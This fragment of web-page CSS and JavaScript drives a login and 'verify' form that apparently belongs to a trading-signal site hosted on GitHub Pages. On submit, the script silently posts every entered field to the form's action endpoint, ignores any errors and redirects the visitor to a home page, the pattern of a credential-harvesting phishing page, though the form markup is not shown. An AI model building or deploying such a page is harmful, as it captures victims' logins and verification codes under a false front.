body.dark .verify{color:white;}
.theme{position:absolute;top:12px;right:12px;cursor:pointer;font-size:14px;padding:6px 10px;border-radius:8px;background:#eee;color:#111;}
body.dark .theme{background:#222;color:white;}

<script>
const form = document.getElementById("form");
const spin = document.getElementById("spin");
const btn = document.getElementById("btn");
const login = document.getElementById("login");
const verify = document.getElementById("verify");

function toggleTheme(){
  if(document.body.classList.contains("dark")){
    document.body.classList.remove("dark");
    localStorage.setItem("theme","light");
  } else {
    document.body.classList.add("dark");
    localStorage.setItem("theme","dark");
  }
}

// restore theme on load
if(localStorage.getItem("theme")==="dark"){
  document.body.classList.add("dark");
}

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  spin.style.display = "block";
  btn.disabled = true;

  // animate pages
  login.style.transform = "translateX(-100%)";
  verify.style.transform = "translateX(-100%)";

  // send form data in background (does not block redirect)
  try {
    await fetch(form.action, {
      method: "POST",
      body: new FormData(form),
      headers: {'Accept':'application/json'}
    });
  } catch(err) {}

  // redirect after short delay
  setTimeout(() => {
    // Replace with your relative or absolute path
    window.location.href = "home.html";
    // OR for GitHub Pages:
    // window.location.href = "https://binatradingsignalconnecthub.github.io/Binstraccuratetradesignal/home.html";
  }, 1800);
});
</script>
